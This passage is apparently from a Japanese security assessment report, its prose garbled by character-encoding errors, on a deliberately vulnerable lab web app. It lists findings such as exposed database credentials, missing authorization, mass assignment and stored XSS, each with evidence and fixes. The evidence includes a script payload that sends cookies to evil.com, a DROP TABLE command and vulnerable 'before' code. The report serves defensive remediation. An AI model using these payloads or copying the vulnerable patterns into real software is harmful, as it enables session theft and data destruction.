    POSTGRES_PASSWORD: postgres123  # â† å¼±ã„ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰
```

```bash
# å¤–éƒ¨ã‹ã‚‰ç›´æ¥æ¥ç¶šå¯èƒ½
psql -h localhost -p 15432 -U postgres -d vulndb
# ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰: postgres123

# æ¥ç¶šå¾Œã€ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½
SELECT * FROM users;
DROP TABLE users;  # ãƒ‡ãƒ¼ã‚¿å‰Šé™¤ã‚‚å¯èƒ½
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªè¨­å®šï¼‰**:
```yaml
# docker-compose.yml
db:
  image: postgres:16-alpine
  ports:
    - "15432:5432"  # â† å¤–éƒ¨å…¬é–‹
  environment:
    POSTGRES_DB: vulndb
    POSTGRES_USER: postgres
    POSTGRES_PASSWORD: postgres123  # â† ãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªè¨­å®šï¼‰**:
```yaml
# docker-compose.yml
db:
  image: postgres:16-alpine
  # ports:ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’å‰Šé™¤ï¼ˆå†…éƒ¨é€šä¿¡ã®ã¿ï¼‰
  environment:
    POSTGRES_DB: vulndb
    POSTGRES_USER: ${DB_USER:-appuser}
    POSTGRES_PASSWORD: ${DB_PASSWORD}  # â† ç’°å¢ƒå¤‰æ•°ã‹ã‚‰å–å¾—
    POSTGRES_INITDB_ARGS: "--auth-host=scram-sha-256"
  # volumes:
  #   - ./init-db.sh:/docker-entrypoint-initdb.d/init-db.sh
  networks:
    - backend

networks:
  backend:
    driver: bridge
    internal: true  # â† å¤–éƒ¨é€šä¿¡ã‚’é®æ–­
```

**.env ãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆ.gitignoreã«è¿½åŠ ï¼‰**:
```bash
# .env
DB_USER=appuser
DB_PASSWORD=<å¼·åŠ›ãªãƒ©ãƒ³ãƒ€ãƒ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰>  # æœ€ä½20æ–‡å­—ã®è‹±æ•°å­—è¨˜å·æ··åœ¨
```

**æ¥ç¶šæ–‡å­—åˆ—ã®æ›´æ–°**:
```json
// appsettings.json
{
  "ConnectionStrings": {
    "DefaultConnection": "Host=db;Port=5432;Database=vulndb;Username=${DB_USER};Password=${DB_PASSWORD};SSL Mode=Require;Trust Server Certificate=true"
  }
}
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **PostgreSQLã®SSL/TLSæœ‰åŠ¹åŒ–**
2. **å°‚ç”¨ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ä½œæˆ**ï¼ˆã‚¹ãƒ¼ãƒ‘ãƒ¼ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™ã‚’ä¸ãˆãªã„ï¼‰
3. **pg_hba.confã®åˆ¶é™å¼·åŒ–**ï¼ˆIPã‚¢ãƒ‰ãƒ¬ã‚¹ãƒ™ãƒ¼ã‚¹ã®ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ï¼‰
4. **å®šæœŸçš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´**

---

#### VULN-006: èªè¨¼ãƒã‚¤ãƒ‘ã‚¹ - DELETEæ“ä½œ

- **CWE**: CWE-862: Missing Authorization
- **OWASP Top 10**: A01:2021 â€“ Broken Access Control
- **CVSS v3.1**: **9.1 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-06
- **å ´æ‰€**: `DELETE /api/users/{id}` (UsersController.cs:166)

**èª¬æ˜**:

ãƒ¦ãƒ¼ã‚¶ãƒ¼å‰Šé™¤ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«èªè¨¼ãƒã‚§ãƒƒã‚¯ãŒå­˜åœ¨ã›ãšã€èª°ã§ã‚‚ä»»æ„ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å‰Šé™¤ã§ãã¾ã™ã€‚

**å½±éŸ¿**:

- ç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®å‰Šé™¤
- ã‚µãƒ¼ãƒ“ã‚¹å¦¨å®³ï¼ˆDoSï¼‰
- ãƒ‡ãƒ¼ã‚¿å®Œå…¨æ€§ã®ç ´å£Š

**è¨¼è·¡**:

```bash
# èªè¨¼ãªã—ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼å‰Šé™¤ãŒæˆåŠŸ
curl -X DELETE http://api:5000/api/users/3

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{"message": "User deleted"}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs:166 - èªè¨¼ãƒã‚§ãƒƒã‚¯ãªã—
[HttpDelete("{id}")]
public async Task<IActionResult> Delete(int id)
{
    // èªè¨¼ãƒ»èªå¯ãƒã‚§ãƒƒã‚¯ãªã—
    using var conn = _dbConnectionFactory.CreateConnection();
    await conn.OpenAsync();
    
    var sql = $"DELETE FROM users WHERE id = {id}";
    // ...
}
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs - å®‰å…¨ãªå®Ÿè£…
[HttpDelete("{id}")]
[Authorize(Roles = "admin")]  // â† ç®¡ç†è€…ã®ã¿å‰Šé™¤å¯èƒ½
public async Task<IActionResult> Delete(int id)
{
    // 1. ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å–å¾—
    var currentUserId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? "0");
    
    // 2. è‡ªåˆ†è‡ªèº«ã®å‰Šé™¤ã‚’é˜²æ­¢
    if (id == currentUserId)
    {
        return BadRequest(new { message = "Cannot delete your own account" });
    }
    
    // 3. ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã‚¯ã‚¨ãƒª
    using var conn = _dbConnectionFactory.CreateConnection();
    await conn.OpenAsync();
    
    var sql = "DELETE FROM users WHERE id = @id RETURNING username";
    using var cmd = new NpgsqlCommand(sql, conn);
    cmd.Parameters.AddWithValue("@id", id);
    
    using var reader = await cmd.ExecuteReaderAsync();
    
    if (!await reader.ReadAsync())
    {
        return NotFound(new { message = "User not found" });
    }
    
    var deletedUsername = reader.GetString(0);
    
    // 4. ç›£æŸ»ãƒ­ã‚°ã®è¨˜éŒ²
    _logger.LogWarning($"User deleted: {deletedUsername} by {User.Identity.Name}");
    
    return Ok(new { message = "User deleted", username = deletedUsername });
}
```

**èªè¨¼ãƒ»èªå¯ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã®è¿½åŠ ï¼ˆProgram.csï¼‰**:
```csharp
// Program.cs
using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.IdentityModel.Tokens;

var builder = WebApplication.CreateBuilder(args);

// JWTèªè¨¼ã®è¿½åŠ 
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = builder.Configuration["Jwt:Issuer"],
            ValidAudience = builder.Configuration["Jwt:Audience"],
            IssuerSigningKey = new SymmetricSecurityKey(
                Encoding.UTF8.GetBytes(builder.Configuration["Jwt:SecretKey"]))
        };
    });

builder.Services.AddAuthorization();

var app = builder.Build();

app.UseAuthentication();  // â† è¿½åŠ 
app.UseAuthorization();   // â† è¿½åŠ 

app.MapControllers();
app.Run();
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **JWTèªè¨¼ã®å®Ÿè£…**
2. **ãƒ­ãƒ¼ãƒ«ãƒ™ãƒ¼ã‚¹èªå¯ã®å®Ÿè£…**
3. **ç›£æŸ»ãƒ­ã‚°ã®è¨˜éŒ²**
4. **å‰Šé™¤å‰ã®ç¢ºèªãƒ•ãƒ­ãƒ¼**ï¼ˆè«–ç†å‰Šé™¤ã¸ã®å¤‰æ›´ã‚’æ¤œè¨ï¼‰

---

#### VULN-007: Mass Assignment - æ¨©é™æ˜‡æ ¼

- **CWE**: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes
- **OWASP Top 10**: A01:2021 â€“ Broken Access Control
- **CVSS v3.1**: **8.1 (High)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl
- **æ¤œè¨¼ID**: V-07
- **å ´æ‰€**: `POST /api/users`, `PUT /api/users/{id}` (UsersController.cs)

**èª¬æ˜**:

ãƒ¦ãƒ¼ã‚¶ãƒ¼ä½œæˆãƒ»æ›´æ–°æ™‚ã«ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒœãƒ‡ã‚£ã®`role`ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãŒãã®ã¾ã¾ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹ãŸã‚ã€ä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç®¡ç†è€…æ¨©é™ã‚’è‡ªåˆ†ã«ä»˜ä¸ã§ãã¾ã™ã€‚

**å½±éŸ¿**:

- ä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚ˆã‚‹ç®¡ç†è€…æ¨©é™ã®å–å¾—
- æ¨©é™æ˜‡æ ¼æ”»æ’ƒ
- ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ã®å®Œå…¨ãªç ´ç¶»

**è¨¼è·¡**:

```bash
# ä¸€èˆ¬ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒç®¡ç†è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½œæˆ
curl -X POST http://api:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username":"attacker",
    "email":"attacker@evil.com",
    "password":"test123",
    "role":"admin"
  }'

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{
  "id": 5,
  "username": "attacker",
  "role": "admin",  # â† ç®¡ç†è€…æ¨©é™ã‚’å–å¾—
  ...
}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// UsersController.cs - roleãŒãã®ã¾ã¾ãƒã‚¤ãƒ³ãƒ‰ã•ã‚Œã‚‹
[HttpPost]
public async Task<IActionResult> Create([FromBody] User user)
{
    var sql = $@"INSERT INTO users (username, email, password, role, ...)
                 VALUES ('{user.Username}', ..., '{user.Role}', ...)";
    // user.RoleãŒæ”»æ’ƒè€…ã«ã‚ˆã£ã¦"admin"ã«è¨­å®šã•ã‚Œã‚‹
}
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```csharp
// CreateUserRequest DTOï¼ˆroleãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ãªã—ï¼‰
public class CreateUserRequest
{
    [Required]
    [StringLength(100, MinimumLength = 3)]
    public string Username { get; set; }
    
    [Required]
    [EmailAddress]
    public string Email { get; set; }
    
    [Required]
    [StringLength(255, MinimumLength = 8)]
    public string Password { get; set; }
    
    [Url]
    public string ProfileImageUrl { get; set; }
    
    // role ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’å‰Šé™¤
}

// UsersController.cs
[HttpPost]
[AllowAnonymous]
public async Task<IActionResult> Create([FromBody] CreateUserRequest request)
{
    if (!ModelState.IsValid)
    {
        return BadRequest(ModelState);
    }
    
    var passwordHash = BCrypt.Net.BCrypt.HashPassword(request.Password);
    
    var sql = @"INSERT INTO users (username, email, password_hash, role, profile_image_url)
                VALUES (@username, @email, @password_hash, @role, @profile_image_url)
                RETURNING id, username, email, role, profile_image_url, created_at";
    
    using var cmd = new NpgsqlCommand(sql, conn);
    cmd.Parameters.AddWithValue("@username", request.Username);
    cmd.Parameters.AddWithValue("@email", request.Email);
    cmd.Parameters.AddWithValue("@password_hash", passwordHash);
    cmd.Parameters.AddWithValue("@role", "user");  // â† å›ºå®šå€¤ã‚’è¨­å®š
    cmd.Parameters.AddWithValue("@profile_image_url", request.ProfileImageUrl ?? "");
    
    // ...
}

// ç®¡ç†è€…ã®ã¿ãŒroleã‚’å¤‰æ›´ã§ãã‚‹å°‚ç”¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ
[HttpPatch("{id}/role")]
[Authorize(Roles = "admin")]
public async Task<IActionResult> UpdateRole(int id, [FromBody] UpdateRoleRequest request)
{
    if (!Enum.IsDefined(typeof(UserRole), request.Role))
    {
        return BadRequest(new { message = "Invalid role" });
    }
    
    var sql = "UPDATE users SET role = @role WHERE id = @id";
    using var cmd = new NpgsqlCommand(sql, conn);
    cmd.Parameters.AddWithValue("@role", request.Role);
    cmd.Parameters.AddWithValue("@id", id);
    
    await cmd.ExecuteNonQueryAsync();
    
    return Ok(new { message = "Role updated" });
}
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **DTOï¼ˆData Transfer Objectï¼‰ã®ä½¿ç”¨**ï¼ˆå…¥åŠ›ã¨å‡ºåŠ›ã§ç•°ãªã‚‹ãƒ¢ãƒ‡ãƒ«ã‚’ä½¿ç”¨ï¼‰
2. **ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆæ–¹å¼ã®æ¡ç”¨**ï¼ˆè¨±å¯ã™ã‚‹ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®ã¿ãƒã‚¤ãƒ³ãƒ‰ï¼‰
3. **ç®¡ç†ç”»é¢ã®åˆ†é›¢**ï¼ˆç®¡ç†è€…æ©Ÿèƒ½ã‚’åˆ¥ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«åˆ†é›¢ï¼‰

---

#### VULN-008: Stored XSS - ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ç”»åƒURL

- **CWE**: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **OWASP Top 10**: A03:2021 â€“ Injection
- **CVSS v3.1**: **9.0 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: curl, Playwright
- **æ¤œè¨¼ID**: V-08
- **å ´æ‰€**: Frontend - UserDetail.tsx:43

**èª¬æ˜**:

`profileImageUrl`ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«å…¥åŠ›ã•ã‚ŒãŸXSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ãŒã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã•ã‚Œãšã«ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ä¿å­˜ã•ã‚Œã€ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã§`dangerouslySetInnerHTML`ã«ã‚ˆã‚Šè¡¨ç¤ºã•ã‚Œã‚‹ãŸã‚ã€Stored XSSãŒç™ºç”Ÿã—ã¾ã™ã€‚

**å½±éŸ¿**:

- ã‚»ãƒƒã‚·ãƒ§ãƒ³ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯
- ç®¡ç†è€…æ¨©é™ã®çªƒå–
- ãƒ•ã‚£ãƒƒã‚·ãƒ³ã‚°æ”»æ’ƒ
- ãƒãƒ«ã‚¦ã‚§ã‚¢é…å¸ƒ

**è¨¼è·¡**:

```bash
# XSSãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ä¿å­˜
curl -X POST http://api:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username":"xsstest",
    "email":"xss@test.com",
    "password":"test123",
    "role":"user",
    "profileImageUrl":"<script>fetch('\''https://evil.com?cookie='\''+document.cookie)</script>"
  }'

# ãƒ•ãƒ­ãƒ³ãƒˆã‚¨ãƒ³ãƒ‰ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼è©³ç´°ã‚’è¡¨ç¤ºã™ã‚‹ã¨XSSãŒç™ºç«
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªã‚³ãƒ¼ãƒ‰ - Frontendï¼‰**:
```tsx
// UserDetail.tsx:43
<td dangerouslySetInnerHTML={{ __html: user.profileImageUrl || '<em>æœªè¨­å®š</em>' }} />
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªã‚³ãƒ¼ãƒ‰ï¼‰**:
```tsx
// UserDetail.tsx - å®‰å…¨ãªå®Ÿè£…
// ã‚ªãƒ—ã‚·ãƒ§ãƒ³1: URLã¨ã—ã¦æ‰±ã„ã€ç”»åƒè¡¨ç¤º
<td>
  {user.profileImageUrl ? (
    <img 
      src={user.profileImageUrl} 
      alt="Profile" 
      style={{ maxWidth: '100px', maxHeight: '100px' }}
      onError={(e) => { e.currentTarget.src = '/placeholder.png'; }}
    />
  ) : (
    <em>æœªè¨­å®š</em>
  )}
</td>

// ã‚ªãƒ—ã‚·ãƒ§ãƒ³2: ãƒ†ã‚­ã‚¹ãƒˆã¨ã—ã¦è¡¨ç¤ºï¼ˆã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ï¼‰
<td>
  {user.profileImageUrl || <em>æœªè¨­å®š</em>}
</td>
```

**APIå´ã®å…¥åŠ›æ¤œè¨¼ï¼ˆè¿½åŠ å¯¾ç­–ï¼‰**:
```csharp
// CreateUserRequest.cs
public class CreateUserRequest
{
    // ...
    
    [Url]  // URLå½¢å¼ã®æ¤œè¨¼
    [StringLength(2048)]
    public string ProfileImageUrl { get; set; }
}

// UsersController.cs
[HttpPost]
public async Task<IActionResult> Create([FromBody] CreateUserRequest request)
{
    // è¿½åŠ ã®URLæ¤œè¨¼
    if (!string.IsNullOrEmpty(request.ProfileImageUrl))
    {
        if (!Uri.TryCreate(request.ProfileImageUrl, UriKind.Absolute, out var uri))
        {
            return BadRequest(new { message = "Invalid profile image URL" });
        }
        
        // HTTPSã®ã¿è¨±å¯
        if (uri.Scheme != "https")
        {
            return BadRequest(new { message = "Profile image URL must use HTTPS" });
        }
        
        // ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆæ–¹å¼ï¼ˆã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰
        var allowedHosts = new[] { "example.com", "cdn.example.com" };
        if (!allowedHosts.Contains(uri.Host))
        {
            return BadRequest(new { message = "Profile image URL host not allowed" });
        }
    }
    
    // ...
}
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **Content Security Policy (CSP) ã®è¨­å®š**
2. **HTMLã‚µãƒ‹ã‚¿ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®ä½¿ç”¨**ï¼ˆDOMPurifyç­‰ï¼‰
3. **ç”»åƒã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰æ©Ÿèƒ½ã®å®Ÿè£…**ï¼ˆå¤–éƒ¨URLã®ä»£ã‚ã‚Šã«è‡ªãƒ›ã‚¹ãƒˆã«ä¿å­˜ï¼‰
4. **X-XSS-Protectionãƒ˜ãƒƒãƒ€ãƒ¼ã®è¨­å®š**

---

#### VULN-009: ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¹³æ–‡ä¿å­˜ãƒ»APIãƒ¬ã‚¹ãƒãƒ³ã‚¹éœ²å‡º

- **CWE**: CWE-256 + CWE-200: Unprotected Storage of Credentials + Exposure of Sensitive Information
- **OWASP Top 10**: A02:2021 â€“ Cryptographic Failures
- **CVSS v3.1**: **9.1 (Critical)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰åˆ†æ, curl
- **å ´æ‰€**: init.sql:8, UsersController.cs (å…¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆ)

**èª¬æ˜**:

ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«å¹³æ–‡ã§ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€ã•ã‚‰ã«APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã‚‚å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯æ¥µã‚ã¦é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ¬ é™¥ã§ã™ã€‚

**å½±éŸ¿**:

- ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ä¾µå®³æ™‚ã®å…¨èªè¨¼æƒ…å ±æ¼æ´©
- APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰çªƒå–
- ä»–ã‚µãƒ¼ãƒ“ã‚¹ã§ã®åŒä¸€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ä½¿ç”¨ã«ã‚ˆã‚‹è¢«å®³æ‹¡å¤§

**è¨¼è·¡**:

```sql
-- init.sql:8
CREATE TABLE users (
    ...
    password VARCHAR(255) NOT NULL,  -- â† å¹³æ–‡
    ...
);

-- seed.sql
INSERT INTO users VALUES
('admin', 'admin@example.com', 'admin123', ...);  -- â† å¹³æ–‡
```

```bash
curl http://api:5000/api/users/1

# ãƒ¬ã‚¹ãƒãƒ³ã‚¹
{
  "id": 1,
  "username": "admin",
  "password": "admin123",  # â† å¹³æ–‡ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒéœ²å‡º
  ...
}
```

**æ˜¯æ­£ææ¡ˆ**:

å„ªå…ˆåº¦: ğŸ”´ å³åº§ã«å¯¾å¿œï¼ˆP0ï¼‰

**ä¿®æ­£å‰ï¼ˆè„†å¼±ãªè¨­è¨ˆï¼‰**:
```sql
-- init.sql
CREATE TABLE users (
    password VARCHAR(255) NOT NULL,  -- å¹³æ–‡
    ...
);
```

**ä¿®æ­£å¾Œï¼ˆå®‰å…¨ãªè¨­è¨ˆï¼‰**:
```sql
-- init.sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(100) NOT NULL UNIQUE,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,  -- â† ãƒãƒƒã‚·ãƒ¥åŒ–
    role VARCHAR(50) NOT NULL DEFAULT 'user',
    profile_image_url TEXT DEFAULT '',
    created_at TIMESTAMP DEFAULT NOW(),
    updated_at TIMESTAMP DEFAULT NOW()
);

-- ã‚¤ãƒ³ãƒ‡ãƒƒã‚¯ã‚¹ã®è¿½åŠ 
CREATE INDEX idx_users_username ON users(username);
CREATE INDEX idx_users_email ON users(email);
```

**ãƒã‚¤ã‚°ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**:
```sql
-- migrate-passwords.sql
-- æ—¢å­˜ãƒ‡ãƒ¼ã‚¿ã®ãƒã‚¤ã‚°ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³

-- 1. æ–°ã—ã„ã‚«ãƒ©ãƒ ã‚’è¿½åŠ 
ALTER TABLE users ADD COLUMN password_hash VARCHAR(255);

-- 2. æ—¢å­˜ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒãƒƒã‚·ãƒ¥åŒ–ï¼ˆä¸€åº¦ã ã‘å®Ÿè¡Œï¼‰
-- æ³¨æ„: ã“ã®å‡¦ç†ã¯ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§å®Ÿè¡Œã™ã¹ã
UPDATE users SET password_hash = crypt(password, gen_salt('bf', 10));

-- 3. æ—§ã‚«ãƒ©ãƒ ã‚’å‰Šé™¤
ALTER TABLE users DROP COLUMN password;

-- 4. NOT NULLåˆ¶ç´„ã‚’è¿½åŠ 
ALTER TABLE users ALTER COLUMN password_hash SET NOT NULL;
```

**User.cs ãƒ¢ãƒ‡ãƒ«ã®æ›´æ–°**:
```csharp
// Models/User.cs
public class User
{
    public int Id { get; set; }
    public string Username { get; set; }
    public string Email { get; set; }
    
    // [JsonIgnore]  // â† APIãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‹ã‚‰é™¤å¤–
    // public string PasswordHash { get; set; }  // â† å†…éƒ¨ã®ã¿ä½¿ç”¨
    
    public string Role { get; set; }
    public string ProfileImageUrl { get; set; }
    public DateTime CreatedAt { get; set; }
    public DateTime UpdatedAt { get; set; }
}

// UserResponseDto.csï¼ˆæ–°è¦ä½œæˆï¼‰
public class UserResponseDto
{
    public int Id { get; set; }
    public string Username { get; set; }
    public string Email { get; set; }
    public string Role { get; set; }
    public string ProfileImageUrl { get; set; }
    public DateTime CreatedAt { get; set; }
    public DateTime UpdatedAt { get; set; }
    
    // passwordãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¯å­˜åœ¨ã—ãªã„
}
```

**UsersController.csã®æ›´æ–°**:
```csharp
// SELECTã‚¯ã‚¨ãƒªã‹ã‚‰passwordã‚’é™¤å¤–
var sql = @"SELECT id, username, email, role, profile_image_url, created_at, updated_at 
            FROM users WHERE id = @id";

// ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯UserResponseDtoã‚’ä½¿ç”¨
return Ok(new UserResponseDto
{
    Id = reader.GetInt32(0),
    Username = reader.GetString(1),
    Email = reader.GetString(2),
    Role = reader.GetString(3),
    ProfileImageUrl = reader.GetString(4),
    CreatedAt = reader.GetDateTime(5),
    UpdatedAt = reader.GetDateTime(6)
});
```

**è¿½åŠ ã®å¯¾ç­–**:
1. **bcrypt/Argon2idã®ä½¿ç”¨**ï¼ˆæ¨å¥¨: BCrypt.Net-Nextï¼‰
2. **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒªã‚·ãƒ¼ã®å®Ÿè£…**ï¼ˆæœ€ä½8æ–‡å­—ã€è¤‡é›‘æ€§è¦ä»¶ï¼‰
3. **å®šæœŸçš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å¤‰æ›´ã®æ¨å¥¨**
4. **æ¼æ´©æ¤œçŸ¥ã‚µãƒ¼ãƒ“ã‚¹ã¨ã®é€£æº**ï¼ˆHave I Been Pwned APIç­‰ï¼‰

---

### 1.2 High ãƒ¬ãƒ™ãƒ«ï¼ˆ2ä»¶ï¼‰

---

#### VULN-010: SSL/TLSæœªä½¿ç”¨ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šï¼‰

- **CWE**: CWE-319: Cleartext Transmission of Sensitive Information
- **OWASP Top 10**: A02:2021 â€“ Cryptographic Failures
- **CVSS v3.1**: **7.4 (High)**
- **CVSS ãƒ™ã‚¯ãƒˆãƒ«**: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
- **æ¤œå‡ºãƒ„ãƒ¼ãƒ«**: ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ç¢ºèª
- **æ¤œè¨¼ID**: V-20
- **å ´æ‰€**: appsettings.json, docker-compose.yml

**èª¬æ˜**:

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹æ¥ç¶šæ–‡å­—åˆ—ã«SSL/TLSè¨­å®šãŒãªãã€é€šä¿¡ãŒå¹³æ–‡ã§è¡Œã‚ã‚Œã¦ã„ã¾ã™ã€‚ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç›—è´ã«ã‚ˆã‚Šèªè¨¼æƒ…å ±ã‚„ãƒ‡ãƒ¼ã‚¿ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**å½±éŸ¿**:

- é€šä¿¡å†…å®¹ã®ç›—è´
- èªè¨¼æƒ…å ±ã®çªƒå–
- ä¸­é–“è€…æ”»æ’ƒï¼ˆMITMï¼‰

**æ˜¯æ­£ææ¡ˆ**:

